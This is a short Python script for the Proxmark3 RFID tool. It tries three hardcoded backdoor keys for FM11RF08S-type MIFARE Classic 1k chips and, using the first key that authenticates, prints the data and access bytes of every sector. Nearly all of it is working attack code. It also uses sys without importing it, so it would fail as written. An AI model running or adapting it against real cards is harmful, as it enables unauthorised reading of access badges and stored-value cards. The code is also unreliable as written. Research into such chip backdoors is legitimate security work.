#!/usr/bin/env python3

# Uses the backdoor keys for the FM11RF08S (and similar) chipsets to quickly dump all the data they can read
# Tested on vulnerable 1k chips only
# Based on the work in this paper: https://eprint.iacr.org/2024/1275

import pm3
import os

TOTAL_SECTORS = 16 #1k chips

BACKDOOR_KEYS = ["A396EFA4E24F", "A31667A8CEC1", "518B3354E760"]
WORKING_KEY = None

required_version = (3, 8)
if sys.version_info < required_version:
    print(f"Python version: {sys.version}")
    print(f"The script needs at least Python v{required_version[0]}.{required_version[1]}. Abort.")
    exit()
p = pm3.pm3()

# Test all the keys first to see which one works (if any)
for bk in BACKDOOR_KEYS:
    p.console(f"hf mf rdbl -c 4 --key {bk} --blk 0")
    output = p.grabbed_output.split('\n')
    
    if "auth error" in output[0].lower():
        continue
    elif "can't select card" in output[0].lower():
        print("Error reading the tag.")
        exit()
    else:
        WORKING_KEY = bk
        break
    
if not WORKING_KEY:
    print("None of the backdoor keys seem to work with this tag.")
    exit()

print(f"Backdoor key {WORKING_KEY} seems to work, dumping data...")
print("IMPORTANT: Only data blocks and access bytes can be dumped; keys will be shown as all 0's")

header = False
# Read every sector
for i in range(TOTAL_SECTORS):
    p.console(f"hf mf rdsc -c 4 --key {WORKING_KEY} -s {i}")
    
    start = False
    for line in p.grabbed_output.split('\n'):
        if not header:
            print(line)
        elif start and len(line) > 0:
            print(line)
            continue
        
        if "----------" in line:
            start = True
            header = True
            continue
        else:
            continue
        
